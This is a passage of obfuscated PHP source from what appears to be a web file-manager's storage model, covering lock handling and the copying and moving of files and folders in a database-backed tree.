$this->_lockCheck($Øé„îÇ¹[548], $Ÿšñ¹ŸØ); $š¾°öıŞ = 1; $this->_lockKey($Øé„îÇ¹[552] . $Ÿšñ¹ŸØ, $š¾°öıŞ); $this->_lockEvent($Ÿšñ¹ŸØ, array($Øé„îÇ¹[546], $Øé„îÇ¹[547]), $š¾°öıŞ); $this->_lockParent($Ÿšñ¹ŸØ, array($Øé„îÇ¹[546], $Øé„îÇ¹[548]), $š¾°öıŞ); $this->_lockEvent($Ÿšñ¹ŸØ, array($Øé„îÇ¹[553], $Øé„îÇ¹[549], $Øé„îÇ¹[550]), $š¾°öıŞ); $this->_lockCheckEnd($Øé„îÇ¹[548], $Ÿšñ¹ŸØ); } public function lockMoveEnd($Ç†˜ÑÅ™) { $ı…İ“Ú =& $_SERVER[ì™ı‰º¯]; if (!$this->allowLock()) { return; } $­ÊÃœÙ = 0; $this->_lockKey($ı…İ“Ú[552] . $Ç†˜ÑÅ™, $­ÊÃœÙ); $this->_lockEvent($Ç†˜ÑÅ™, array($ı…İ“Ú[546], $ı…İ“Ú[547]), $­ÊÃœÙ); $this->_lockParent($Ç†˜ÑÅ™, array($ı…İ“Ú[546], $ı…İ“Ú[548]), $­ÊÃœÙ); $this->_lockEvent($Ç†˜ÑÅ™, array($ı…İ“Ú[553], $ı…İ“Ú[549], $ı…İ“Ú[550]), $­ÊÃœÙ); } private function _lockCheck($‹©ª¶¨ì, $œØöœù¸) { $˜Ä²Íú =& $_SERVER[ì™ı‰º¯]; $©¹Ó…ËÍ = $this->sourceInfo($œØöœù¸); $éüÌ¤ÃË = $‹©ª¶¨ì . $˜Ä²Íú[10] . $œØöœù¸; $this->_lockTimeStart[$éüÌ¤ÃË] = timeFloat(); if (!is_array($©¹Ó…ËÍ)) { return; } $¸õ÷†¨­ = LNG($˜Ä²Íú[554]); CacheLock::setErrorMsg($˜Ä²Íú[162] . htmlspecialchars($©¹Ó…ËÍ[$˜Ä²Íú[32]]) . $˜Ä²Íú[164] . $¸õ÷†¨­); $this->_lockKey($éüÌ¤ÃË, 1); $this->_lockKey($éüÌ¤ÃË, 0); $§„©“ˆ = array_reverse($this->parentLevelArray($©¹Ó…ËÍ[$˜Ä²Íú[511]])); foreach ($§„©“ˆ as $ì’°†•) { $éüÌ¤ÃË = $‹©ª¶¨ì . $˜Ä²Íú[555] . $ì’°†•; if (CacheLock::lockGet($˜Ä²Íú[556] . $éüÌ¤ÃË)) { $©¹Ó…ËÍ = $this->sourceInfo($ì’°†•); CacheLock::setErrorMsg($˜Ä²Íú[162] . htmlspecialchars($©¹Ó…ËÍ[$˜Ä²Íú[32]]) . $˜Ä²Íú[164] . $¸õ÷†¨­); $this->_lockKey($éüÌ¤ÃË, 1); $this->_lockKey($éüÌ¤ÃË, 0); } } } private function _lockCheckEnd($ÄÏšÈß, $¨û­ãˆ¬) { $é¶Şó«Ï =& $_SERVER[ì™ı‰º¯]; $É¤›ùƒ = $ÄÏšÈß . $é¶Şó«Ï[10] . $¨û­ãˆ¬; CacheLock::setErrorMsg($é¶Şó«Ï[378]); if (!isset($this->_lockTimeStart[$É¤›ùƒ])) { return; } $öãÄı‡å = timeFloat() - $this->_lockTimeStart[$É¤›ùƒ]; unset($this->_lockTimeStart[$É¤›ùƒ]); if ($öãÄı‡å > 0.5) { unset(self::$cacheSourceInfo[$é¶Şó«Ï[460] . $¨û­ãˆ¬]); } $¤Üéò¬Æ = $this->sourceInfo($¨û­ãˆ¬); if (!$¤Üéò¬Æ) { show_json(LNG($é¶Şó«Ï[105]), !1); } } private function _lockParent($Ìë†îØñ, $æŠø®·Ì, $à¥ùÉû’) { if (!$this->autoLockSet) { return; } $Ê´ÉÑŠŠ = $this->sourceInfo($Ìë†îØñ); if (!is_array($Ê´ÉÑŠŠ)) { return; } $²£Õïæû = array_reverse($this->parentLevelArray($Ê´ÉÑŠŠ[$_SERVER[ì™ı‰º¯][511]])); foreach ($²£Õïæû as $†¾¼ªÎÄ) { $this->_lockEvent($†¾¼ªÎÄ, $æŠø®·Ì, $à¥ùÉû’); } } private function _lockEvent($µü¾‘á, $Êªî‘Îì, $°ªìÔÔ®) { $ö’‰”É˜ =& $_SERVER[ì™ı‰º¯]; if (!$this->autoLockSet) { return; } foreach ($Êªî‘Îì as $ªˆÎÔ•á) { $œÄåëœ† = $ªˆÎÔ•á . $ö’‰”É˜[10] . $µü¾‘á; if ($°ªìÔÔ® && CacheLock::lockGet($ö’‰”É˜[556] . $œÄåëœ†)) { continue; } $this->_lockKey($œÄåëœ†, $°ªìÔÔ®); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($›—…†ú, $ˆÀğõ˜ö = 1) { $İÎ¡ğˆã = $_SERVER[ì™ı‰º¯][556] . md5($›—…†ú); if ($ˆÀğõ˜ö) { if (isset(self::$_lockItemArr[$İÎ¡ğˆã])) { return; } self::$_lockItemArr[$İÎ¡ğˆã] = 1; CacheLock::lock($İÎ¡ğˆã, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$İÎ¡ğˆã])) { return; } unset(self::$_lockItemArr[$İÎ¡ğˆã]); CacheLock::unlock($İÎ¡ğˆã); } } public function isParentOf($÷É‰•Õ, $¸µå¡ı‰) { $¾œïá‰² =& $_SERVER[ì™ı‰º¯]; $ê…ïá“€ = $this->sourceInfo($÷É‰•Õ); $àŒïüç = $this->sourceInfo($¸µå¡ı‰); $˜ãÖî·™ = $ê…ïá“€[$¾œïá‰²[511]] . $ê…ïá“€[$¾œïá‰²[402]] . $¾œïá‰²[50]; $ù“¦ûÃÇ = $àŒïüç[$¾œïá‰²[511]] . $àŒïüç[$¾œïá‰²[402]] . $¾œïá‰²[50]; $˜Ã¢ø¥ä = strpos($ù“¦ûÃÇ, $˜ãÖî·™) === 0; return $˜Ã¢ø¥ä; } private $targetIsDelete = 0; public function copy($ºÓßÃ¡é, $†¤¿Øæ, $ó¯Õ—Áç = REPEAT_REPLACE, $©şà™ßÅ = '') { $±—œ˜•“ =& $_SERVER[ì™ı‰º¯]; $Úû‰µ“Ë = $this->sourceInfo($ºÓßÃ¡é); $Õú¿õÜ¼ = $this->sourceInfo($†¤¿Øæ); if (!$Úû‰µ“Ë || !$Õú¿õÜ¼ || $Õú¿õÜ¼[$±—œ˜•“[410]] != $±—œ˜•“[88]) { return !1; } if ($this->isParentOf($ºÓßÃ¡é, $†¤¿Øæ)) { return !1; } $Äá£ÖÂ¡ = $©şà™ßÅ ? $©şà™ßÅ : $Úû‰µ“Ë[$±—œ˜•“[32]]; $this->lockCopyStart($ºÓßÃ¡é); $this->lockWriteStart($†¤¿Øæ, $Äá£ÖÂ¡); $´Óã¤ = array($±—œ˜•“[557] => array(), $±—œ˜•“[558] => array(), $±—œ˜•“[559] => array()); $this->targetIsDelete = intval($Úû‰µ“Ë[$±—œ˜•“[431]]); $Ş–™ò„Ù = $this->fileNameExistCache($†¤¿Øæ, $Úû‰µ“Ë[$±—œ˜•“[32]]); $çøŒµ²¸ = $this->_copy($ºÓßÃ¡é, $†¤¿Øæ, $ó¯Õ—Áç, $´Óã¤, !0, $©şà™ßÅ); $this->_childrenListClear(); $this->lockCopyEnd($ºÓßÃ¡é); $this->lockWriteEnd($†¤¿Øæ, $Äá£ÖÂ¡); if ($Úû‰µ“Ë[$±—œ˜•“[410]] == $±—œ˜•“[88] && $Ş–™ò„Ù == $çøŒµ²¸) { $this->folderSizeResetChildren($Ş–™ò„Ù); } Model($±—œ˜•“[560])->addAll($´Óã¤[$±—œ˜•“[558]], array(), !0); if ($Ş–™ò„Ù != $çøŒµ²¸ || $Úû‰µ“Ë[$±—œ˜•“[410]] == $±—œ˜•“[88]) { Model($±—œ˜•“[561])->eventCopy($çøŒµ²¸); } $this->saveAll($´Óã¤[$±—œ˜•“[559]]); Model($±—œ˜•“[200])->linkAdd($´Óã¤[$±—œ˜•“[557]]); $this->folderSizeReset($†¤¿Øæ); $this->updateModifyTime($†¤¿Øæ); return $çøŒµ²¸; } private function _copy($‹İúù¸, $Èò¯®ç£, $ÊÍ„ÄÏ³, &$˜ÍÇıÂ, $ÖŸ‚ıßÖ, $²ˆè“‰ = '') { $½øŒ±òã =& $_SERVER[ì™ı‰º¯]; $ÀäÁğ‹² = $this->sourceInfoCache($‹İúù¸); $¸õ‹£µ¯ = $ÀäÁğ‹²[$½øŒ±òã[410]] == $½øŒ±òã[88]; $î¢ş‡ºŞ = $²ˆè“‰ ? $²ˆè“‰ : $ÀäÁğ‹²[$½øŒ±òã[32]]; $™Ø°¯™Ó = $this->fileNameExistCache($Èò¯®ç£, $î¢ş‡ºŞ); if ($ÖŸ‚ıßÖ) { $this->_childrenAllMake($‹İúù¸); if ($¸õ‹£µ¯ && $™Ø°¯™Ó) { $this->_childrenAllMake($™Ø°¯™Ó); } } if (!$™Ø°¯™Ó) { return $this->_copyCreate($‹İúù¸, $Èò¯®ç£, $î¢ş‡ºŞ, $˜ÍÇıÂ); } $‘Ï¸ Ñï = $™Ø°¯™Ó; if ($¸õ‹£µ¯) { if ($ÊÍ„ÄÏ³ == REPEAT_RENAME_FOLDER) { $î¢ş‡ºŞ = $this->fileNameAutoCache($Èò¯®ç£, $î¢ş‡ºŞ, $ÊÍ„ÄÏ³, $¸õ‹£µ¯); $‘Ï¸ Ñï = $this->_copyCreate($‹İúù¸, $Èò¯®ç£, $î¢ş‡ºŞ, $˜ÍÇıÂ); } else { $Á°–’ = $this->_childrenList($‹İúù¸); foreach ($Á°–’ as $Øâ‘–Ñ˜) { $this->_copy($Øâ‘–Ñ˜[$½øŒ±òã[402]], $™Ø°¯™Ó, $ÊÍ„ÄÏ³, $˜ÍÇıÂ, !1); } } } else { if ($ÊÍ„ÄÏ³ == REPEAT_RENAME || $ÊÍ„ÄÏ³ == REPEAT_RENAME_FOLDER) { $î¢ş‡ºŞ = $this->fileNameAutoCache($Èò¯®ç£, $î¢ş‡ºŞ, $ÊÍ„ÄÏ³, $¸õ‹£µ¯); $‘Ï¸ Ñï = $this->_copyCreate($‹İúù¸, $Èò¯®ç£, $î¢ş‡ºŞ, $˜ÍÇıÂ); } else { if ($ÊÍ„ÄÏ³ == REPEAT_REPLACE) { $€ÚÊÃñº = $this->sourceInfoCache($™Ø°¯™Ó); $€¬Âµò = $this->fileHistory($€ÚÊÃñº, $ÀäÁğ‹²[$½øŒ±òã[468]], $ÀäÁğ‹²[$½øŒ±òã[76]]); if ($€¬Âµò) { $˜ÍÇıÂ[$½øŒ±òã[557]][] = $ÀäÁğ‹²[$½øŒ±òã[468]]; } } else { if ($ÊÍ„ÄÏ³ == REPEAT_SKIP) { } } } Hook::trigger($½øŒ±òã[562], array($½øŒ±òã[563], $ÀäÁğ‹², 0)); } return $‘Ï¸ Ñï; } private function _copyCreate($áÓ“Ù»Ü, $äÉ€êšä, $òÈ’Å´, &$‹´×‡ÀÊ) { $¼ú·†©é =& $_SERVER[ì™ı‰º¯]; $†ÇƒßÃ = $this->sourceInfoCache($áÓ“Ù»Ü); $ßãê³¿‡ = $this->sourceInfoCache($äÉ€êšä); $ğü¹­ = $this->_makeItemData($†ÇƒßÃ, $ßãê³¿‡, $òÈ’Å´); Hook::trigger($¼ú·†©é[564], $ğü¹­); Hook::trigger($¼ú·†©é[565], array($¼ú·†©é[566], $ğü¹­, 0)); $ÙœŞÆ = $this->add($ğü¹­); $ëÏŸİµ = array($¼ú·†©é[402] => $ÙœŞÆ, $¼ú·†©é[32] => $òÈ’Å´); $this->_copyApplyMeta($ëÏŸİµ, $‹´×‡ÀÊ); if ($†ÇƒßÃ[$¼ú·†©é[410]] != $¼ú·†©é[88]) { $‹´×‡ÀÊ[$¼ú·†©é[557]][] = $†ÇƒßÃ[$¼ú·†©é[468]]; return $ÙœŞÆ; } $‘ìßë‘£ = array(); $££Ò³ÁÆ = array(); $this->_childrenListAll($áÓ“Ù»Ü, $‘ìßë‘£); $‰åî†©ê = count($‘ìßë‘£); if ($‰åî†©ê == 0) { return $ÙœŞÆ; } $ãÄí¤¢ = $this->sourceInfo($ÙœŞÆ); foreach ($‘ìßë‘£ as $¹Å‘‡ö‹) { $æ°Ş¶ç = $this->_makeItemData($¹Å‘‡ö‹, $ãÄí¤¢, $¹Å‘‡ö‹[$¼ú·†©é[32]]); $æ°Ş¶ç[$¼ú·†©é[511]] = $¹Å‘‡ö‹[$¼ú·†©é[511]]; $££Ò³ÁÆ[] = $æ°Ş¶ç; } $this->chunkEventSet($¼ú·†©é[567], array($¼ú·†©é[568], $ğü¹­, $‰åî†©ê)); $this->addAll($££Ò³ÁÆ, array(), !1); $™ÉöÕËß = $this->where(array($¼ú·†©é[432] => $ÙœŞÆ))->select(); $Ï™È÷Õï = $this->_childrenMakeRelation($‘ìßë‘£, $™ÉöÕËß); $Ï™È÷Õï[$áÓ“Ù»Ü] = $ÙœŞÆ; $’á¥’ÂÉ = array(); $í÷Ïñõñ = array(); foreach ($™ÉöÕËß as $¹Å‘‡ö‹) { $Çê²†İ‹ = $¹Å‘‡ö‹[$¼ú·†©é[402]]; $¡€¹õÓˆ = $this->_childrenMatch($Ï™È÷Õï, $¹Å‘‡ö‹, $ãÄí¤¢); $’á¥’ÂÉ[] = array($¼ú·†©é[402], $Çê²†İ‹, $¼ú·†©é[432], $¡€¹õÓˆ[$¼ú·†©é[432]]); $í÷Ïñõñ[] = array($¼ú·†©é[402], $Çê²†İ‹, $¼ú·†©é[511], $¡€¹õÓˆ[$¼ú·†©é[511]]); $this->_copyApplyMeta($¹Å‘‡ö‹, $‹´×‡ÀÊ); if ($¹Å‘‡ö‹[$¼ú·†©é[410]] != $¼ú·†©é[88]) { $‹´×‡ÀÊ[$¼ú·†©é[557]][] = $¹Å‘‡ö‹[$¼ú·†©é[468]]; } } $this->chunkEventSet($¼ú·†©é[569], array($¼ú·†©é[570], $ğü¹­, $‰åî†©ê)); $this->saveAll($’á¥’ÂÉ); $this->chunkEventSet($¼ú·†©é[571], array($¼ú·†©é[572], $ğü¹­, $‰åî†©ê)); $this->saveAll($í÷Ïñõñ); return $ÙœŞÆ; } private function _childrenMakeRelation($ï›ˆ‚ó, $ËŞ¨ë—š) { $àÃ¾Óƒ‘ =& $_SERVER[ì™ı‰º¯]; $à©£Øä = array(); $ƒŒîä¡Û = array(); foreach ($ï›ˆ‚ó as $ÔÆäç¡) { $®ªˆ‡ª’ = $ÔÆäç¡[$àÃ¾Óƒ‘[32]] . $àÃ¾Óƒ‘[8] . $ÔÆäç¡[$àÃ¾Óƒ‘[511]]; $à©£Øä[$®ªˆ‡ª’] = $ÔÆäç¡[$àÃ¾Óƒ‘[402]]; } foreach ($ËŞ¨ë—š as $ÔÆäç¡) { $®ªˆ‡ª’ = $ÔÆäç¡[$àÃ¾Óƒ‘[32]] . $àÃ¾Óƒ‘[8] . $ÔÆäç¡[$àÃ¾Óƒ‘[511]]; $Î‹ïğ•½ = $à©£Øä[$®ªˆ‡ª’]; $ƒŒîä¡Û[$Î‹ïğ•½] = $ÔÆäç¡[$àÃ¾Óƒ‘[402]]; } return $ƒŒîä¡Û; } private function _childrenMatch($öµØ’â¨, $öèĞÚû˜, $ôéø¸´ü) { $Ô–ªÔğı =& $_SERVER[ì™ı‰º¯]; $†ŞºÉñù = $ôéø¸´ü[$Ô–ªÔğı[511]]; $ËóıËİà = $this->parentLevelArray($öèĞÚû˜[$Ô–ªÔğı[511]]); foreach ($ËóıËİà as $µº–Ñò®) { if (isset($öµØ’â¨[$µº–Ñò®])) { $†ŞºÉñù .= $öµØ’â¨[$µº–Ñò®] . $Ô–ªÔğı[573]; } } $†ŞºÉñù = rtrim($†ŞºÉñù, $Ô–ªÔğı[50]) . $Ô–ªÔğı[50]; $¶‚ë±£­ = $this->parentLevelArray($†ŞºÉñù); $­è¤…êå = $¶‚ë±£­[count($¶‚ë±£­) - 1]; return array($Ô–ªÔğı[432] => $­è¤…êå, $Ô–ªÔğı[511] => $†ŞºÉñù); } private function _makeItemData($“„‘Òı, $ùà‹ñ±Ç, $ğ¸Ïİ³) { $ê¯Ş¶¹Ä =& $_SERVER[ì™ı‰º¯]; $¸èÅÜ˜Û = array($ê¯Ş¶¹Ä[574] => $“„‘Òı[$ê¯Ş¶¹Ä[410]], $ê¯Ş¶¹Ä[420] => $ğ¸Ïİ³, $ê¯Ş¶¹Ä[575] => $“„‘Òı[$ê¯Ş¶¹Ä[412]] ? $“„‘Òı[$ê¯Ş¶¹Ä[412]] : $ê¯Ş¶¹Ä[12], $ê¯Ş¶¹Ä[469] => $“„‘Òı[$ê¯Ş¶¹Ä[468]] ? $“„‘Òı[$ê¯Ş¶¹Ä[468]] : 0, $ê¯Ş¶¹Ä[545] => $“„‘Òı[$ê¯Ş¶¹Ä[76]] ? $“„‘Òı[$ê¯Ş¶¹Ä[76]] : 0, $ê¯Ş¶¹Ä[576] => intval($ùà‹ñ±Ç[$ê¯Ş¶¹Ä[411]]), $ê¯Ş¶¹Ä[577] => intval($ùà‹ñ±Ç[$ê¯Ş¶¹Ä[496]]), $ê¯Ş¶¹Ä[578] => intval(USER_ID), $ê¯Ş¶¹Ä[579] => intval(USER_ID), $ê¯Ş¶¹Ä[401] => intval($ùà‹ñ±Ç[$ê¯Ş¶¹Ä[402]]), $ê¯Ş¶¹Ä[580] => $ùà‹ñ±Ç[$ê¯Ş¶¹Ä[511]] . $ùà‹ñ±Ç[$ê¯Ş¶¹Ä[402]] . $ê¯Ş¶¹Ä[50], $ê¯Ş¶¹Ä[424] => $“„‘Òı[$ê¯Ş¶¹Ä[85]] ? $“„‘Òı[$ê¯Ş¶¹Ä[85]] : time(), $ê¯Ş¶¹Ä[430] => 0, $ê¯Ş¶¹Ä[581] => $ê¯Ş¶¹Ä[12]); return $¸èÅÜ˜Û; } private function _copyApplyMeta($Ã€ñáå³, &$ö¦ë×öØ) { $ÑäşÊ€‡ =& $_SERVER[ì™ı‰º¯]; $€‡áÔÕµ = $Ã€ñáå³[$ÑäşÊ€‡[402]]; $®á«Ëäì = $Ã€ñáå³[$ÑäşÊ€‡[32]]; if (!isset($Ã€ñáå³[$ÑäşÊ€‡[582]]) || !$Ã€ñáå³[$ÑäşÊ€‡[582]] || $Ã€ñáå³[$ÑäşÊ€‡[582]] == $ÑäşÊ€‡[198]) { $ö¦ë×öØ[$ÑäşÊ€‡[559]][] = array($ÑäşÊ€‡[402], $€‡áÔÕµ, $ÑäşÊ€‡[582], short_id($€‡áÔÕµ)); } if (Input::check($®á«Ëäì, $ÑäşÊ€‡[583])) { $ö¦ë×öØ[$ÑäşÊ€‡[558]][] = array($ÑäşÊ€‡[402] => $€‡áÔÕµ, $ÑäşÊ€‡[94] => $ÑäşÊ€‡[465], $ÑäşÊ€‡[374] => str_replace($ÑäşÊ€‡[53], $ÑäşÊ€‡[12], Pinyin::get($®á«Ëäì))); $ö¦ë×öØ[$ÑäşÊ€‡[558]][] = array($ÑäşÊ€‡[402] => $€‡áÔÕµ, $ÑäşÊ€‡[94] => $ÑäşÊ€‡[464], $ÑäşÊ€‡[374] => Pinyin::get($®á«Ëäì, $ÑäşÊ€‡[584])); } $ö¦ë×öØ[$ÑäşÊ€‡[558]][] = array($ÑäşÊ€‡[402] => $€‡áÔÕµ, $ÑäşÊ€‡[94] => $ÑäşÊ€‡[444], $ÑäşÊ€‡[374] => KodSort::makeStr($®á«Ëäì)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($´È¯²Î) { $¡™¨ïÏ =& $_SERVER[ì™ı‰º¯]; $­œâ÷êÃ = $this->sourceInfo($´È¯²Î); $åé½®’Ò = $¡™¨ïÏ[585]; $™½ÉşÙ¢ = array($¡™¨ïÏ[511] => array($¡™¨ïÏ[540], $­œâ÷êÃ[$¡™¨ïÏ[511]] . $´È¯²Î . $¡™¨ïÏ[541]), $¡™¨ïÏ[431] => $this->targetIsDelete); $ãç¡§ŞÛ = $this->field($åé½®’Ò)->where($™½ÉşÙ¢)->select(); if (!$ãç¡§ŞÛ) { return; } $ãç¡§ŞÛ = array_to_keyvalue($ãç¡§ŞÛ, $¡™¨ïÏ[402]); foreach ($ãç¡§ŞÛ as $œ’¤Ğú£) { $ÈÊš¬ƒ¨ = $œ’¤Ğú£[$¡™¨ïÏ[432]]; $´È¯²Î = $œ’¤Ğú£[$¡™¨ïÏ[402]]; if (!isset($this->_childrenListCache[$´È¯²Î]) && $œ’¤Ğú£[$¡™¨ïÏ[410]] == $¡™¨ïÏ[88]) { $this->_childrenListCache[$´È¯²Î] = array(); } if (!isset($this->_childrenListCache[$ÈÊš¬ƒ¨])) { $this->_childrenListCache[$ÈÊš¬ƒ¨] = array(); } $this->_childrenListCache[$ÈÊš¬ƒ¨][$´È¯²Î] = $œ’¤Ğú£; $this->_childrenItemCache[$´È¯²Î] = $œ’¤Ğú£; } } private function _childrenListAll($À¸°òè®, &$ıÆ¢—„¢) { $µŒÊÇœÄ =& $_SERVER[ì™ı‰º¯]; if (!isset($this->_childrenListCache[$À¸°òè®])) { return; } $çò²¢É‘ = $this->_childrenListCache[$À¸°òè®]; foreach ($çò²¢É‘ as $ú£´äí° => $•ÌèâúÊ) { $ıÆ¢—„¢[$ú£´äí°] = $•ÌèâúÊ; if ($•ÌèâúÊ[$µŒÊÇœÄ[410]] == $µŒÊÇœÄ[88]) { $this->_childrenListAll($ú£´äí°, $ıÆ¢—„¢); } } } private function sourceInfoCache($ñ‹Öñ±) { if (isset($this->_childrenItemCache[$ñ‹Öñ±])) { return $this->_childrenItemCache[$ñ‹Öñ±]; } return $this->sourceInfo($ñ‹Öñ±); } private function _childrenList($àŸŞıö¡) { if (isset($this->_childrenListCache[$àŸŞıö¡])) { return $this->_childrenListCache[$àŸŞıö¡]; } return $this->_childrenListSelect($àŸŞıö¡); } private function _childrenListSelect($ü‡Ô—«ı) { $å¾²ÏÀï =& $_SERVER[ì™ı‰º¯]; $¤“ÌĞÄœ = array($å¾²ÏÀï[432] => $ü‡Ô—«ı, $å¾²ÏÀï[431] => $this->targetIsDelete); $ş•³İİŠ = $this->where($¤“ÌĞÄœ)->select(); $ş•³İİŠ = $ş•³İİŠ ? $ş•³İİŠ : array(); $ıŞí‰Ù = array_to_keyvalue($ş•³İİŠ, $å¾²ÏÀï[402]); $this->_childrenListCache[$ü‡Ô—«ı] = $ıŞí‰Ù; foreach ($ıŞí‰Ù as $ü‡Ô—«ı => $î¬óŸİ) { $this->_childrenItemCache[$ü‡Ô—«ı] = $î¬óŸİ; } return $ıŞí‰Ù; } private function fileNameExistCache($€ñİ¯‚, $ÇÖ÷ŸªÌ) { $ö™Ó®ûƒ =& $_SERVER[ì™ı‰º¯]; $ÇÖ÷ŸªÌ = strtolower($ÇÖ÷ŸªÌ); $üËîŸÃ® = $this->_childrenList($€ñİ¯‚); foreach ($üËîŸÃ® as $Ü¹ÆéØì) { if ($ÇÖ÷ŸªÌ == strtolower($Ü¹ÆéØì[$ö™Ó®ûƒ[32]])) { return $Ü¹ÆéØì[$ö™Ó®ûƒ[402]]; } } return !1; } private function fileNameAutoCache($¡Œ¿³“˜, $•¡şğÛ³, $Ãµ™®šæ, $¾×²Æ±à) { $·‚œíÉ =& $_SERVER[ì™ı‰º¯]; $Ğã›Ÿ² = $this->_childrenList($¡Œ¿³“˜); $­÷¥Œã = array_to_keyvalue($Ğã›Ÿ², $·‚œíÉ[12], $·‚œíÉ[32]); return $this->fileNameAutoGet($­÷¥Œã, $•¡şğÛ³, $Ãµ™®šæ, $¾×²Æ±à); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($¡î”Æ÷­, $À¯“ı¸Ä, $Ïåºéæ› = REPEAT_REPLACE, $Éüøó¨¦ = '') { $É›«ÎŸÎ =& $_SERVER[ì™ı‰º¯]; $ÎĞâ¿°ø = $this->sourceInfo($¡î”Æ÷­); $½•¡ˆÚŠ = $this->sourceInfo($À¯“ı¸Ä); if ($ÎĞâ¿°ø[$É›«ÎŸÎ[432]] == $½•¡ˆÚŠ[$É›«ÎŸÎ[402]]) { if ($ÎĞâ¿°ø[$É›«ÎŸÎ[431]] == $É›«ÎŸÎ[88]) { Model($É›«ÎŸÎ[429])->restore(array($¡î”Æ÷­)); } if (!$Éüøó¨¦ || $Éüøó¨¦ == $ÎĞâ¿°ø[$É›«ÎŸÎ[32]]) { return $¡î”Æ÷­; } } $³Û¤¾Ş = $this->pathInfoMore($¡î”Æ÷­); if ($this->isParentOf($¡î”Æ÷­, $À¯“ı¸Ä)) { return !1; } if (!$ÎĞâ¿°ø || !$½•¡ˆÚŠ || $½•¡ˆÚŠ[$É›«ÎŸÎ[410]] != $É›«ÎŸÎ[88]) { return !1; } Hook::trigger($É›«ÎŸÎ[586], $³Û¤¾Ş); $this->targetIsDelete = intval($ÎĞâ¿°ø[$É›«ÎŸÎ[431]]); if ($ÎĞâ¿°ø[$É›«ÎŸÎ[432]] == $À¯“ı¸Ä && $Éüøó¨¦ != $ÎĞâ¿°ø[$É›«ÎŸÎ[32]]) { $Œˆêó§ = $this->fileNameExist($À¯“ı¸Ä, $Éüøó¨¦); if ($Œˆêó§ && $ÎĞâ¿°ø[$É›«ÎŸÎ[410]] == $É›«ÎŸÎ[198]) { $Úş¾«µÂ = $this->sourceInfo($Œˆêó§); $å…ØÙÚÊ = $this->fileHistory($Úş¾«µÂ, $ÎĞâ¿°ø[$É›«ÎŸÎ[468]], $ÎĞâ¿°ø[$É›«ÎŸÎ[76]]); if (!$å…ØÙÚÊ) { Model($É›«ÎŸÎ[471])->remove($ÎĞâ¿°ø[$É›«ÎŸÎ[468]]); } $this->removeNow($¡î”Æ÷­, !1); $this->folderSizeReset($À¯“ı¸Ä); Hook::trigger($É›«ÎŸÎ[587], $³Û¤¾Ş); return $Œˆêó§; } } $ÂİÇ»ì¨ = $Éüøó¨¦ ? $Éüøó¨¦ : $ÎĞâ¿°ø[$É›«ÎŸÎ[32]]; $this->lockMoveStart($¡î”Æ÷­); $this->lockWriteStart($À¯“ı¸Ä, $ÂİÇ»ì¨); $ÁùªËÙœ = array($É›«ÎŸÎ[557] => array(), $É›«ÎŸÎ[588] => !1); $this->clearShare($¡î”Æ÷­, $À¯“ı¸Ä); $ŸÊÚ‘İÃ = $this->fileNameExistCache($À¯“ı¸Ä, $ÎĞâ¿°ø[$É›«ÎŸÎ[32]]); $Â†Õ•â€ = $this->_move($¡î”Æ÷­, $À¯“ı¸Ä, $Ïåºéæ›, $ÁùªËÙœ, $Éüøó¨¦); $this->sourceCacheClear(); if ($ÎĞâ¿°ø[$É›«ÎŸÎ[410]] == $É›«ÎŸÎ[88] && $ŸÊÚ‘İÃ) { $this->folderSizeResetChildren($Â†Õ•â€); } Model($É›«ÎŸÎ[200])->linkAdd($ÁùªËÙœ[$É›«ÎŸÎ[557]]); if ($ŸÊÚ‘İÃ && $ÁùªËÙœ[$É›«ÎŸÎ[588]]) { $this->removeNow($¡î”Æ÷­, !1); } $this->lockMoveEnd($¡î”Æ÷­); $this->lockWriteEnd($À¯“ı¸Ä, $ÂİÇ»ì¨); $this->folderSizeReset($ÎĞâ¿°ø[$É›«ÎŸÎ[432]]); $this->folderSizeReset($À¯“ı¸Ä); $®ïË´×ô = array($ÎĞâ¿°ø[$É›«ÎŸÎ[432]], $À¯“ı¸Ä); if ($ÎĞâ¿°ø[$É›«ÎŸÎ[410]] == $É›«ÎŸÎ[88]) { $®ïË´×ô[] = $¡î”Æ÷­; } $this->updateModifyTime($®ïË´×ô); Model($É›«ÎŸÎ[561])->eventMove($¡î”Æ÷­, $ÎĞâ¿°ø[$É›«ÎŸÎ[432]], $À¯“ı¸Ä); Hook::trigger($É›«ÎŸÎ[587], $³Û¤¾Ş); return $Â†Õ•â€; } private function _move($¶»ª·”É, $Î€‰Şå„, $¨ŸŞ†Ãä, &$‚·¶¢», $æë¹ªÕœ = '') { $½•åéÏî =& $_SERVER[ì™ı‰º¯]; $±ç®È´ó = $this->sourceInfo($¶»ª·”É); $šöòŒà› = $±ç®È´ó[$½•åéÏî[410]] == $½•åéÏî[88]; $†Ú„È—Ë = $æë¹ªÕœ ? $æë¹ªÕœ : $±ç®È´ó[$½•åéÏî[32]]; $ó¥ÙŸºâ = $this->fileNameExistCache($Î€‰Şå„, $†Ú„È—Ë); $this->lockMoveStart($¶»ª·”É); $this->lockWriteStart($Î€‰Şå„, $†Ú„È—Ë); if (!$ó¥ÙŸºâ) { return $this->_moveForce($¶»ª·”É, $Î€‰Şå„, $†Ú„È—Ë); } $ùÆ½šÇÀ = $ó¥ÙŸºâ; $ íøğÅ° = !1; if ($šöòŒà›) { if ($¨ŸŞ†Ãä == REPEAT_RENAME_FOLDER) { $†Ú„È—Ë = $this->fileNameAuto($Î€‰Şå„, $†Ú„È—Ë, $¨ŸŞ†Ãä, $šöòŒà›); $ùÆ½šÇÀ = $this->_moveForce($¶»ª·”É, $Î€‰Şå„, $†Ú„È—Ë); } else { if ($¨ŸŞ†Ãä == REPEAT_RENAME_FOLDER) { $¨ŸŞ†Ãä = REPEAT_RENAME; } $»É «Ì = $this->_childrenListSelect($¶»ª·”É); foreach ($»É «Ì as $´Ö†ôö”) { $this->_move($´Ö†ôö”[$½•åéÏî[402]], $ó¥ÙŸºâ, $¨ŸŞ†Ãä, $‚·¶¢»); } $ íøğÅ° = !0; } } else { if ($¨ŸŞ†Ãä == REPEAT_SKIP) { $ íøğÅ° = !0; } else { if ($¨ŸŞ†Ãä == REPEAT_RENAME || $¨ŸŞ†Ãä == REPEAT_RENAME_FOLDER) { $†Ú„È—Ë = $this->fileNameAuto($Î€‰Şå„, $†Ú„È—Ë, $¨ŸŞ†Ãä, 